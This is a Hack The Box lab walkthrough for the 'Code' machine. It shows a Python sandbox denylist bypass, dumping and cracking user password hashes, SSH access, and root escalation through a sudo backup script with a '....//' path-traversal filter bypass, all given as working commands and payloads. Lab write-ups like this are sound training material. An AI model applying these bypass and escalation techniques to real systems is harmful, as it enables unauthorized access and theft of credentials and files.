# CODE – HTB Walkthrough

## 🧭 Enumeration
We begin by scanning the open ports on the host:

```bash
nmap -sS -p- 10.10.11.62 -T5
```

Output:
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Port 5000 running a UPnP service catches my attention.

### 🧠 Quick Research on UPnP
> **UPnP (Universal Plug and Play)** allows devices on a network to discover each other and establish communication.  
> It can create direct communication channels with the internet, but it’s potentially risky on public networks.

## 🔍 Port 5000 – Service Detection
```bash
nmap -sV -p 5000 10.10.11.62 -T5
```

Output:
```bash
5000/tcp open  http Gunicorn 20.0.4
```

Gunicorn is a Python WSGI HTTP server, often used to serve Flask apps.  
Browsing the site reveals a sandboxed Python code execution area with login/registration.

## 🧪 Sandbox Testing
```python
print("os.listdir()")
```
→ `Use of restricted keywords is not allowed.`

```python
print("o" + "s")
```
→ `os` is printed. There's a denylist filter.

## 🔍 Exploring Globals
Using `sys.modules`, I discover SQLAlchemy models, Flask routes, and a reference to the `User` and `Code` classes.

## 🧑‍💻 Dumping Users from DB
```python
for user in User.query.all():
    print(user.__dict__)
```

Output:
```json
{'username': 'development', 'password': '759b74ce43947f5f4c91aeddc3e5bad3'}
{'username': 'martin', 'password': '3de6f30c4a09c27fc71932bfc68474be'}
```

Hash cracking with `john`:
```bash
john --show --format=Raw-MD5 hashes.txt
```

Result:
```
development:?
martin:nafeelswordsmaster
```

## 🔐 SSH Access as martin
SSH into the box using `martin`’s credentials. Access to `/home/app-production` is restricted.

## 📦 Discovering `backy.sh`
```bash
sudo -l
```

Output:
```
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

`backy.sh` is a wrapper for the binary `backy`, which compresses directories into `.tar.bz2` archives defined via a `task.json`.

## 📁 Reading `/home/app-production`
Using this `task.json`:
```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/app-production/app"
  ],
  "exclude": []
}
```

Execute:
```bash
sudo /usr/bin/backy.sh task.json
```

Then:
```bash
tar -xf code_home_app-production_*.tar.bz2
cat home/app-production/user.txt
```

→ User flag obtained ✅

## 🧨 PrivEsc via Path Traversal
`backy.sh` filters `../` using `jq`:

```bash
map(gsub("\.\./"; ""))
```

But using `/var/....//root` bypasses the filter → becomes `/var/../root`.

```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/var/....//root"
  ],
  "exclude": []
}
```

Then:
```bash
sudo /usr/bin/backy.sh task.json
tar -xf code_var_.._root_*.tar.bz2
cat root/root.txt
```

→ Root flag obtained ✅

## 🏁 Summary

| Step      | Description                                  |
|-----------|----------------------------------------------|
| nmap      | Enumerate ports                              |
| Sandbox   | Web Python execution with filters            |
| DB access | Dump + crack hashes                          |
| SSH       | Login as `martin`                            |
| PrivEsc   | Abuse `backy.sh` and bypass path filter      |
| Root      | Read `/root/root.txt` from archive           |

🎉 Rooted!
